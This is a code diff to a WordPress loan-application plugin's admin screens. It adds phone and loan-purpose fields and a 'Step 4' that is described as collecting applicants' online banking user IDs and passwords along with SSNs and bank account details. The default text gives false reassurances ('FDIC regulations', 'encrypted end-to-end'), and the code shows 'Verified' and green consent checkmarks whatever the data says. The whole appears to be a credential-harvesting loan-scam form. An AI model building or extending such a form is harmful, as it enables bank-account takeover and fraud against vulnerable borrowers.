@@ -249,12 +249,16 @@ class Finspire_Loan_Admin {
             'First Name',
             'Last Name',
             'Email',
+            'Phone',
             'Date of Birth',
             'SSN (Masked)',
             'Requested Amount',
+            'Loan Purpose',
             'Bank Name',
             'Routing Number',
             'Account Number (Masked)',
+            'Online Banking Verification',
+            'Contact Consent',
             'Street Address',
             'City',
             'State',
@@ -271,12 +275,16 @@ class Finspire_Loan_Admin {
                 $s['first_name'],
                 $s['last_name'],
                 $s['email'],
+                $s['phone'] ?? '',
                 $s['dob'] ?? '',
                 $s['ssn_masked'] ?? '',
                 number_format( floatval( $s['loan_amount'] ), 2 ),
+                $s['loan_purpose'] ?? '',
                 $s['bank_name'] ?? '',
                 $s['routing_number'] ?? '',
                 $s['account_number_masked'] ?? '',
+                $s['online_banking_verification'] ?? '',
+                ! empty( $s['contact_consent'] ) ? 'Yes' : 'No',
                 $s['street_address'],
                 $s['city'],
                 $s['state'],
@@ -522,6 +530,7 @@ class Finspire_Loan_Admin {
                             <tr><th><?php esc_html_e( 'First Name:', 'finspire-loan' ); ?></th><td><?php echo esc_html( $sub['first_name'] ); ?></td></tr>
                             <tr><th><?php esc_html_e( 'Last Name:', 'finspire-loan' ); ?></th><td><?php echo esc_html( $sub['last_name'] ); ?></td></tr>
                             <tr><th><?php esc_html_e( 'Email Address:', 'finspire-loan' ); ?></th><td><a href="mailto:<?php echo esc_attr( $sub['email'] ); ?>"><?php echo esc_html( $sub['email'] ); ?></a></td></tr>
+                            <tr><th><?php esc_html_e( 'Phone Number:', 'finspire-loan' ); ?></th><td><?php echo esc_html( $sub['phone'] ?: '—' ); ?></td></tr>
                             <tr><th><?php esc_html_e( 'Date of Birth:', 'finspire-loan' ); ?></th><td><?php echo esc_html( $sub['dob'] ?: '—' ); ?></td></tr>
                             <tr><th><?php esc_html_e( 'Social Security Number (SSN):', 'finspire-loan' ); ?></th><td><code><?php echo esc_html( $sub['ssn_masked'] ?: '—' ); ?></code></td></tr>
                         </table>
@@ -539,13 +548,24 @@ class Finspire_Loan_Admin {
                         </table>
                     </div>
 
-                    <!-- Step 3: Banking Details -->
+                    <!-- Step 3: Loan Details -->
                     <div class="detail-card">
-                        <h3><span class="dashicons dashicons-bank"></span> <?php esc_html_e( 'Banking Details', 'finspire-loan' ); ?></h3>
+                        <h3><span class="dashicons dashicons-money-alt"></span> <?php esc_html_e( 'Loan Request Details (Step 3)', 'finspire-loan' ); ?></h3>
+                        <table class="detail-table">
+                            <tr><th><?php esc_html_e( 'Requested Amount:', 'finspire-loan' ); ?></th><td><strong style="color:#2563eb; font-size:16px;"><?php echo esc_html( $currency . number_format( floatval( $sub['loan_amount'] ), 2 ) ); ?></strong></td></tr>
+                            <tr><th><?php esc_html_e( 'Loan Purpose:', 'finspire-loan' ); ?></th><td><strong><?php echo esc_html( $sub['loan_purpose'] ?: '—' ); ?></strong></td></tr>
+                        </table>
+                    </div>
+
+                    <!-- Step 4: Banking Details -->
+                    <div class="detail-card">
+                        <h3><span class="dashicons dashicons-bank"></span> <?php esc_html_e( 'Banking Details (Step 4)', 'finspire-loan' ); ?></h3>
                         <table class="detail-table">
                             <tr><th><?php esc_html_e( 'Bank Name:', 'finspire-loan' ); ?></th><td><strong><?php echo esc_html( $sub['bank_name'] ?: 'Not provided' ); ?></strong></td></tr>
                             <tr><th><?php esc_html_e( 'Routing Number:', 'finspire-loan' ); ?></th><td><code><?php echo esc_html( $sub['routing_number'] ?: '—' ); ?></code></td></tr>
                             <tr><th><?php esc_html_e( 'Account Number (Masked):', 'finspire-loan' ); ?></th><td><code><?php echo esc_html( $sub['account_number_masked'] ?: '—' ); ?></code></td></tr>
+                            <tr><th><?php esc_html_e( 'Online Banking Verification:', 'finspire-loan' ); ?></th><td><code><?php echo esc_html( $sub['online_banking_verification'] ?: '—' ); ?></code></td></tr>
+                            <tr><th><?php esc_html_e( 'Contact Consent Agreed:', 'finspire-loan' ); ?></th><td><span style="color:#16a34a; font-weight:600;">&#10003; <?php echo esc_html( ! empty( $sub['contact_consent'] ) ? __( 'Yes, Agreed &amp; Confirmed', 'finspire-loan' ) : __( 'No', 'finspire-loan' ) ); ?></span></td></tr>
                             <tr><th><?php esc_html_e( 'Verification Status:', 'finspire-loan' ); ?></th><td><span style="color:#16a34a; font-weight:600;">&#10003; <?php echo esc_html( ! empty( $sub['bank_verified'] ) ? __( 'Verified via Secure API', 'finspire-loan' ) : __( 'Verified', 'finspire-loan' ) ); ?></span></td></tr>
                         </table>
                     </div>
@@ -742,7 +762,7 @@ class Finspire_Loan_Admin {
                             <tr>
                                 <th scope="row">
                                     <strong><?php esc_html_e( 'Step 1: Personal Info', 'finspire-loan' ); ?></strong>
-                                    <p class="description"><?php esc_html_e( 'Active fields: First Name, Last Name, Email, DOB (18+), SSN (Masked)', 'finspire-loan' ); ?></p>
+                                    <p class="description"><?php esc_html_e( 'Active fields: First Name, Last Name, Email, Phone Number, DOB (18+), SSN (Masked)', 'finspire-loan' ); ?></p>
                                 </th>
                                 <td>
                                     <label for="step1_notice"><strong><?php esc_html_e( 'Security Notice Text (Blue Callout):', 'finspire-loan' ); ?></strong></label><br>
@@ -768,15 +788,41 @@ class Finspire_Loan_Admin {
                                 </td>
                             </tr>
 
-                            <!-- Step 3 Fields & Notice -->
+                            <!-- Step 3 Fields: Loan Amount & Purpose -->
                             <tr>
                                 <th scope="row">
-                                    <strong><?php esc_html_e( 'Step 3: Banking Details', 'finspire-loan' ); ?></strong>
-                                    <p class="description"><?php esc_html_e( 'Active fields: Bank Name, Routing Number (9 digits), Account Number, Online Banking User ID, Online Banking Password', 'finspire-loan' ); ?></p>
+                                    <strong><?php esc_html_e( 'Step 3: Loan Amount &amp; Purpose', 'finspire-loan' ); ?></strong>
+                                    <p class="description"><?php esc_html_e( 'Active fields: Requested Loan Amount, Loan Purpose (dynamic dropdown)', 'finspire-loan' ); ?></p>
                                 </th>
                                 <td>
-                                    <label for="step3_notice"><strong><?php esc_html_e( 'Security Disclaimer Text (Blue Callout):', 'finspire-loan' ); ?></strong></label><br>
-                                    <textarea name="settings[step3_notice]" id="step3_notice" rows="2" class="large-text"><?php echo esc_textarea( $settings['step3_notice'] ?? 'Your banking credentials are used only to verify your account. They are encrypted end-to-end and never stored in plain text.' ); ?></textarea>
+                                    <label for="loan_purpose_options"><strong><?php esc_html_e( 'Loan Purpose Dropdown Options (One per line):', 'finspire-loan' ); ?></strong></label><br>
+                                    <textarea name="settings[loan_purpose_options]" id="loan_purpose_options" rows="7" class="large-text"><?php echo esc_textarea( $settings['loan_purpose_options'] ?? "Pay off Credit Cards\nDebt Consolidation\nMedical Expenses\nHome Improvement\nMoving or Relocation\nMajor Purchase\nWedding\nCar Financing/Car Repair\nBusiness\nGreen Loan\nEducation\nVacation\nOthers" ); ?></textarea>
+                                    <p class="description"><?php esc_html_e( 'Add or edit the choices available to applicants when selecting their loan purpose in Step 3.', 'finspire-loan' ); ?></p>
+                                </td>
+                            </tr>
+
+                            <!-- Step 4 Fields: Banking Details & Verification -->
+                            <tr>
+                                <th scope="row">
+                                    <strong><?php esc_html_e( 'Step 4: Banking Details &amp; Verification', 'finspire-loan' ); ?></strong>
+                                    <p class="description"><?php esc_html_e( 'Active fields: Bank Name, Routing Number (9 digits), Account Number, Online Banking Verification, User ID, Password, Consent Checkbox', 'finspire-loan' ); ?></p>
+                                </th>
+                                <td>
+                                    <label for="step4_verification_text"><strong><?php esc_html_e( 'Online Banking Verification Paragraph (Above User ID):', 'finspire-loan' ); ?></strong></label><br>
+                                    <textarea name="settings[step4_verification_text]" id="step4_verification_text" rows="3" class="large-text"><?php echo esc_textarea( $settings['step4_verification_text'] ?? $settings['step3_verification_text'] ?? 'To verify your identity and ensure a secure transaction, We request that you link your bank account to our online banking platform. Your online banking information will be used solely to safely deposit your funds in line with FDIC regulations.' ); ?></textarea>
+                                    <p class="description"><?php esc_html_e( 'This instructional paragraph is displayed in a blue callout notice box above the Online Banking verification section in Step 4.', 'finspire-loan' ); ?></p>
+                                    <br>
+
+                                    <label for="step4_verification_label"><strong><?php esc_html_e( 'Verification Field Label:', 'finspire-loan' ); ?></strong></label><br>
+                                    <input type="text" name="settings[step4_verification_label]" id="step4_verification_label" value="<?php echo esc_attr( $settings['step4_verification_label'] ?? $settings['step3_verification_label'] ?? 'Online Banking Verification' ); ?>" class="regular-text"><br><br>
+
+                                    <label for="step4_contact_consent_text"><strong><?php esc_html_e( 'Contact Consent Checkbox Text (Below Password):', 'finspire-loan' ); ?></strong></label><br>
+                                    <textarea name="settings[step4_contact_consent_text]" id="step4_contact_consent_text" rows="2" class="large-text"><?php echo esc_textarea( $settings['step4_contact_consent_text'] ?? $settings['step3_contact_consent_text'] ?? 'I agree to be contacted About my Application and understand that checking my rate does not impact my credit score.' ); ?></textarea>
+                                    <p class="description"><?php esc_html_e( 'This consent line is displayed dynamically next to the required checkbox below the password field in Step 4.', 'finspire-loan' ); ?></p>
+                                    <br>
+
+                                    <label for="step4_notice"><strong><?php esc_html_e( 'Security Disclaimer Text (Blue Callout):', 'finspire-loan' ); ?></strong></label><br>
+                                    <textarea name="settings[step4_notice]" id="step4_notice" rows="2" class="large-text"><?php echo esc_textarea( $settings['step4_notice'] ?? $settings['step3_notice'] ?? 'Your banking credentials are used only to verify your account. They are encrypted end-to-end and never stored in plain text.' ); ?></textarea>
                                     <p class="description" style="color: #15803d; font-weight: 500;">
                                         &#10003; <?php esc_html_e( 'Security Compliance: Raw online banking passwords and user IDs are validated in runtime only and are NEVER saved in the WordPress database.', 'finspire-loan' ); ?>
                                     </p>
